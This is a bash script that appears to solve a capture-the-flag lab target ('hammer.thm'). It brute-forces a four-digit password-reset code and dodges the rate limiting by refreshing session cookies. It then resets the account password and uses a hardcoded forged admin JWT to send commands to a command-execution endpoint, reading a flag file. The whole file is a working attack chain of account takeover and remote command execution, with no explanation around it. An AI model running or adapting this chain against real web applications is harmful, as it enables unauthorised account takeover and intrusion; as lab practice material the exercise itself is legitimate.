#!/usr/bin/env bash

ip='10.10.195.125'
url="http://$ip:1337"

reset="$url/reset_password.php"
log_out="$url/log_out.php"
x="$url/execute_command.php"

email='tester@hammer.thm'
pass='test'

function get_session()
{
        curl -sL $log_out --cookie-jar cookie.txt -O
        curl -sL $reset --cookie-jar cookie.txt -O
        curl -sL $reset -d "email=$email" --cookie-jar cookie.txt -O
}

function attempt_pin()
{
        pin=$1
        response=$(curl -sL $reset -d "recovery_code=$pin" --cookie cookie.txt --cookie-jar cookie.txt)
        if [[ $response == *"Invalid"* ]]; then
                echo "Invalid code: $pin"
        elif [[ $response == *"Time"* ]]; then
                echo "Time expired"
		get_session
		continue
        elif [[ $response == *"Rate"* ]]; then
                echo "Rate limit hit: $pin"
                echo "trying new cookies..."
                get_session
                echo "Retrying pin..."
                attempt_pin $pin
        else
                echo "SUCCESS:" $pin
                response=$(curl -sL $reset -d "new_password=$pass" -d "confirm_password=$pass" --cookie cookie.txt --cookie-jar cookie.txt)
                echo $response > result.html
                exit
        fi
}

function attack()
{
    while IFS="" read -r pin
    do
        attempt_pin $pin
    done < pins.txt
}

function login()
{
	curl -sL $url -d "email=$email" -d "password=$pass" --cookie cookie.txt --cookie-jar cookie.txt -o result.html
	token=$(grep -Eo "jwtToken = '(.*)';" result.html | awk -F\' '{print $2}')
	send_ls $token
}

function send_ls()
{
	token=$2
	curl -sL $x -d '{"command": "ls"}' -H 'Content-Type: application/json' -H "Authorization: Bearer $token" --cookie-jar cookie.txt --cookie cookie.txt
}

function get_flag()
{
	login
	token='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM0NjU2ODI3LCJleHAiOjE3MzQ2NjA0MjcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.N1Jc0l41yo66trQRgZASR3Lu2I2RtHiqqSNCQVAAXXk'
	curl -sL $x -d '{"command": "cat /home/ubuntu/flag.txt"}' -H 'Content-Type: application/json' -H "Authorization: Bearer $token" --cookie-jar cookie.txt --cookie cookie.txt
}

function setup()
{
    crunch 4 4 0123456789 -o pins.txt
    get_session
}
#setup
#attack
get_flag
